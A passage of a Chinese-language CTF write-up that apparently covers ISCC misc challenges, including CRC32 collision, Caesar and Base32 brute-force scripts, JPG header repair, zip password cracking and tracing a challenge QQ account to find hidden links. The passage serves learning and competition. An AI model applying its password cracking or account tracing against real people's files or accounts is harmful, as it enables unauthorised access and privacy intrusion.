class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T5 = (T1 * T1) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T4 = (X1 * T4) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            X3 = (T5 - T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T2 = (Y1 * T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T3 = (T4 - X3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            T1 = (T1 * T3) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>            Y3 = (T1 - T2) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br><br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">3</span><br>            <span class="hljs-keyword">return</span> form % (X3, Y3, Z3)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_convert_jacb_to_nor</span>(<span class="hljs-params">self, Point</span>):</span> <br>        len_2 = <span class="hljs-number">2</span> * self.para_len<br>        x = <span class="hljs-built_in">int</span>(Point[<span class="hljs-number">0</span>:self.para_len], <span class="hljs-number">16</span>)<br>        y = <span class="hljs-built_in">int</span>(Point[self.para_len:len_2], <span class="hljs-number">16</span>)<br>        z = <span class="hljs-built_in">int</span>(Point[len_2:], <span class="hljs-number">16</span>)<br>        z_inv = <span class="hljs-built_in">pow</span>(z, <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>) - <span class="hljs-number">2</span>, <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>))<br>        z_invSquar = (z_inv * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        z_invQube = (z_invSquar * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        x_new = (x * z_invSquar) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        y_new = (y * z_invQube) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        z_new = (z * z_inv) % <span class="hljs-built_in">int</span>(self.ecc_table[<span class="hljs-string">&#x27;p&#x27;</span>], base=<span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">if</span> z_new == <span class="hljs-number">1</span>:<br>            form = <span class="hljs-string">&#x27;%%0%dx&#x27;</span> % self.para_len<br>            form = form * <span class="hljs-number">2</span><br>            <span class="hljs-keyword">return</span> form % (x_new, y_new)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sk = func.random_hex(<span class="hljs-built_in">len</span>(sm2p256v1_ecc_table[<span class="hljs-string">&#x27;n&#x27;</span>]))<br>    tsm2 = TSM2(sk)<br>    print(<span class="hljs-string">&#x27;pk:%s&#x27;</span>   %tsm2.pk)<br>    print(<span class="hljs-string">&#x27;pks:%064x&#x27;</span>%tsm2.pks)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        op = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;op: &#x27;</span>).strip()<br>        <span class="hljs-keyword">if</span> op == <span class="hljs-string">&#x27;sign&#x27;</span>:<br>            sign(tsm2)<br>        <span class="hljs-keyword">elif</span> op == <span class="hljs-string">&#x27;verify&#x27;</span>:<br>            verify(tsm2)<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;&quot;&quot;sign: sign message</span><br><span class="hljs-string">verify: verify message&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>暂时没做出来</p><h3 id="混乱的音频"><a href="#混乱的音频" class="headerlink" title="混乱的音频"></a>混乱的音频</h3><blockquote><p>题目描述：<br>小明正在整理包含bed、bird、cat、dog、down、eight的音频文件数据，可小明不小心把分类好的一部分数据集弄混了。文件名非常混乱，无法判别出那些文件属于哪个单词类别。碰巧小红来问小明考试复习资料的密码。小明说：“我记得这个密码都是大写的英文字母，并且密码和我的爱好息息相关，具体的我也记不清了。你要是能帮我把这些音频文件分好类，你应该就会发现密码。”小红了解到小明是个计算机专业的学生，平时经常搜集一些与信息技术有关的新闻资讯。他经常参加ctf比赛，对密码学十分熟悉，对数字非常敏感。为了小红能得到考试复习资料，你能帮助小红将混乱的音频文件分好类并获取密码吗？<br>提示：比例 数据下载链接：<a href="https://pan.baidu.com/s/1r8C1FByHpgNZJsaUkjASOw">https://pan.baidu.com/s/1r8C1FByHpgNZJsaUkjASOw</a> 提取码：p1yh</p></blockquote><h3 id="小明的宠物兔"><a href="#小明的宠物兔" class="headerlink" title="小明的宠物兔"></a>小明的宠物兔</h3><blockquote><p>题目描述：<br>小明的宠物兔总是发出一些神秘的声音，小明很想知道兔兔在干什么，你能帮他翻译一下吗？</p></blockquote><p>一张图片rabbit.txt，提示碰撞，应该是CRC32碰撞，foremost分离出压缩包</p><p>flag.txt内容，加salt，应该是rabbit加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw==<br></code></pre></td></tr></table></figure><p>CRC32碰撞，得到加密压缩包key.zip内容，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">┌──(kali㉿kali)-[~/桌面/Python/CRC32]<br>└─$ python3 crc32.py reverse <span class="hljs-number">0x3dacac6b</span> <br><span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>: &#123;<span class="hljs-number">0x47</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xce</span>&#125;<br>verification checksum: <span class="hljs-number">0x3dacac6b</span> (OK)<br><span class="hljs-number">5</span> <span class="hljs-built_in">bytes</span>: (<span class="hljs-number">0_0</span>) (OK)<br><span class="hljs-number">5</span> <span class="hljs-built_in">bytes</span>: DCr4m (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 1QhloU (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 3mmr6H (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 49Gqqk (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 5Uumn6 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 7ips7+ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 8Gpbyp (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 9G1Sbi (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: EHZxWz (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: F93jxv (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: I6mk_a (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: J+wTt) (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: K+6eo0 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: KGEHkt (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: N/jUuJ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: O/+dnS (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: O3d8oG (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: TX.K94 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: Uy1jKa (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: XJju5k (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: YJ+D.r (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: Zvoklv (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: a3H1hL (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: dG(pwf (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: e7U0i/ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: fgb2/o (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: g6AbXj (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: kHvqPq (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: kT9-Qe (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: lQqOzZ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: vwW0Z8 (OK)                     <br></code></pre></td></tr></table></figure><p>5字节，最终密钥为<code>(0_0)</code>，Rabbit解密得到flag<br><img src="https://img-blog.csdnimg.cn/20210518182708616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h2><h3 id="小明的表情包"><a href="#小明的表情包" class="headerlink" title="小明的表情包"></a>小明的表情包</h3><blockquote><p>放假期间小红被亲戚叫去帮店里帮忙，店里忙极了导致小红没有时间写代码。小红苦恼极了，她突然想起来小明有一张非常适合描述她此时心情的表情包。于是，小红让小明把表情包分享给她。小明说如果你记得我的出生的日月年，我就交给你。小明的生日年份隐藏在这串凯撒密码“AVARGRRA<br>AVARGL AVAR”中，你能帮小红得到小明的表情包吗？</p></blockquote><p>编写脚本进行凯撒密码爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;AVARGRRA AVARGL AVAR&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kaisa</span>(<span class="hljs-params">k</span>):</span><br>    t = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">else</span>:<br>            t += c<br>    print(t)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>):<br>    kaisa(i)<br><br></code></pre></td></tr></table></figure><p>看到有含义的英文：NINETEEN NINETY NINE<br><img src="https://img-blog.csdnimg.cn/20210502214305685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>猜测是901909，然而并不是压缩包口令，根据题目提示密码是生日年份，直接爆破8位数字密码<br><img src="https://img-blog.csdnimg.cn/20210502214743451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到口令07071999，解压压缩包，得到的jpg文件无法打开，拖入010 editor中，与正常的jpg文件比较，发现缺少JPG文件头<br><img src="https://img-blog.csdnimg.cn/20210502215507914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将前八位改为FF D8 FF E0 00 10 4A 46，保存得到flag<br><img src="https://img-blog.csdnimg.cn/20210502215613249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Base小偷"><a href="#Base小偷" class="headerlink" title="Base小偷"></a>Base小偷</h3><blockquote><p>被凯撒小猫偷走的等号1/3<br>Flag格式：flag{XXX}</p></blockquote><p>密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli<br></code></pre></td></tr></table></figure><p>使用上面的凯撒密码爆破脚本，修改一下脚本，写入crack.txt文件中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli&quot;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;crack.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kaisa</span>(<span class="hljs-params">k</span>):</span><br>    t = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">else</span>:<br>            t += c<br>    print(t)<br>    f.write(t+<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>):<br>    kaisa(i)<br></code></pre></td></tr></table></figure><p>得到crack.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli<br>usfgz2l2pw2mjh2hre2frblpykrdx4mauogmj<br>vtgha2m2qx2nki2isf2gscmqzlsey4nbvphnk<br>wuhib2n2ry2olj2jtg2htdnramtfz4ocwqiol<br>xvijc2o2sz2pmk2kuh2iueosbnuga4pdxrjpm<br>ywjkd2p2ta2qnl2lvi2jvfptcovhb4qeyskqn<br>zxkle2q2ub2rom2mwj2kwgqudpwic4rfztlro<br>aylmf2r2vc2spn2nxk2lxhrveqxjd4sgaumsp<br>bzmng2s2wd2tqo2oyl2myiswfryke4thbvntq<br>canoh2t2xe2urp2pzm2nzjtxgszlf4uicwour<br>dbopi2u2yf2vsq2qan2oakuyhtamg4vjdxpvs<br>ecpqj2v2zg2wtr2rbo2pblvziubnh4wkeyqwt<br>fdqrk2w2ah2xus2scp2qcmwajvcoi4xlfzrxu<br>gersl2x2bi2yvt2tdq2rdnxbkwdpj4ymgasyv<br>hfstm2y2cj2zwu2uer2seoyclxeqk4znhbtzw<br>igtun2z2dk2axv2vfs2tfpzdmyfrl4aoicuax<br>jhuvo2a2el2byw2wgt2ugqaenzgsm4bpjdvby<br>kivwp2b2fm2czx2xhu2vhrbfoahtn4cqkewcz<br>ljwxq2c2gn2day2yiv2wiscgpbiuo4drlfxda<br>mkxyr2d2ho2ebz2zjw2xjtdhqcjvp4esmgyeb<br>nlyzs2e2ip2fca2akx2ykueirdkwq4ftnhzfc<br>omzat2f2jq2gdb2bly2zlvfjselxr4guoiagd<br>pnabu2g2kr2hec2cmz2amwgktfmys4hvpjbhe<br>qobcv2h2ls2ifd2dna2bnxhlugnzt4iwqkcif<br>rpcdw2i2mt2jge2eob2coyimvhoau4jxrldjg<br>sqdex2j2nu2khf2fpc2dpzjnwipbv4kysmekh<br></code></pre></td></tr></table></figure><p>猜测是Base32编码，得到密文每行37字符 ，而Base32按5比特切分的二进制数据必须是40比特的倍数，需要在每行末尾追三个===，并且小写转换为大写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding: UTF-8</span><br><span class="hljs-keyword">import</span> base64<br><br>ff = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;crack.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        line_n =line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        line_n=line_n+<span class="hljs-string">r&#x27;===&#x27;</span>+<span class="hljs-string">&#x27;\n&#x27;</span>     <span class="hljs-comment">#行末尾加上&quot;===&quot;,同时加上&quot;\n&quot;换行符</span><br>        line_new=line_n.upper()        <span class="hljs-comment">#小写转换为大写</span><br>        ff.write(line_new)           <span class="hljs-comment">#写入一个新文件中</span><br>ff.close()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>    <span class="hljs-built_in">list</span> = f.read().splitlines()   <span class="hljs-comment">#存入列表中</span><br>    i = <span class="hljs-number">0</span><br>    ls2 = [<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]  <span class="hljs-comment">#转换为字符串类型</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>):<br>        print(base64.b32decode(ls2[i]))<br>        i += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>运行脚本，发现一段base64编码<br><img src="https://img-blog.csdnimg.cn/20210502213613369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">flag&#123;tqq.tqq@jjb&#125;<br></code></pre></td></tr></table></figure><h3 id="真作假时假亦真"><a href="#真作假时假亦真" class="headerlink" title="真作假时假亦真"></a>真作假时假亦真</h3><blockquote><p>浅韵姐姐第一次参加ISCC，但没有很多CTF工具，为此她很苦恼。<br>你能切身体会一下吗？<br>附件下载链接：<a href="https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw">https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw</a><br>提取码：a0oh</p></blockquote><p>下载附件，得到download.wav，拖入Audacity查看频谱图</p><p><img src="https://img-blog.csdnimg.cn/20210508204254102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>弄下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.. ... -.-. -.-. ---... .... . -.-. .... --- -. . -.-- --..-- .-.-.. -.-- --- ..- .-.. --- --- -.- .. -. --. ..-. --- .-. - .... . ..-. ..- -.-. -.- .. -. --. ..-. .-.. .- --. -. --- .-- ..--..<br></code></pre></td></tr></table></figure><p>摩斯密码解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCCHECHONEYYOULOOKINGFORTHEFUCKINGFLAGNOW?<br></code></pre></td></tr></table></figure><p>不是flag，foremost分离文件得到一张png图片，exiftool查看图片信息，得到QQ号<br><img src="https://img-blog.csdnimg.cn/20210508204759240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看QQ空间，在留言板发现假flag<img src="https://img-blog.csdnimg.cn/20210508204953265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加好友问题<code>ISCC&#123;e@$Y_s0cia1_engineering&#125;</code>也是假flag</p><p>空间里唯一的一张图片<br><img src="https://img-blog.csdnimg.cn/202105082051187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我当时做的时候掉坑里去了，直接下载图片，010 editor什么也看不到，思路就断了。<br><img src="https://img-blog.csdnimg.cn/20210508193738188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用原图地址链接下载图片，能看到一个蓝奏云链接<br><img src="https://img-blog.csdnimg.cn/20210508193452110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://wwa.lanzous.com/iNVbsoqrz8f<br>MTVDQw==<br></code></pre></td></tr></table></figure><p>提取码是<code>MTVDQw==</code>，Base64解码得到<code>15CC</code>,下载附件<br><img src="https://img-blog.csdnimg.cn/20210508211008367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用<a href="http://z.duoluosb.com/">在线网站</a>进行社会主义核心价值观解密得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs 